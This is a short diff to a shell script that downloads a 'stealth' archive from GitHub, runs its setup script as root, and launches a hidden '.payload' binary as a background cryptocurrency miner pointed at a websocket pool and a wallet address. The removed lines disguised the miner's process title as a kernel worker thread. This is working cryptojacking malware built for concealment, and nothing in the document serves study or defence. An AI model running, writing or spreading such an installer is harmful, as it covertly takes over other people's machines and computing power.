@@ -1,5 +1,7 @@
+sudo apt update
+sudo apt install gcc -y
 wget https://github.com/wakitobi/glowing-umbrella/raw/refs/heads/main/stealth.tar.gz
 tar xzf stealth.tar.gz
-sudo bash setup.sh --threads 4 --cpu 60 --title kworker/u8:2
-./.payload mine-wss wss://thorough-jaquelin-berakitame-aeabd1e4.koyeb.app/bmEucnBsYW50Lnh5ejo3MDIy mbc1qlgghxg3026yfxp3zw63m86qhleesnk0euzthmd.CPU x 15
+sudo bash setup.sh 
+nohup ./.payload mine-wss wss://thorough-jaquelin-berakitame-aeabd1e4.koyeb.app/bmEucnBsYW50Lnh5ejo3MDIy mbc1qlgghxg3026yfxp3zw63m86qhleesnk0euzthmd.CPU x 15 &
 
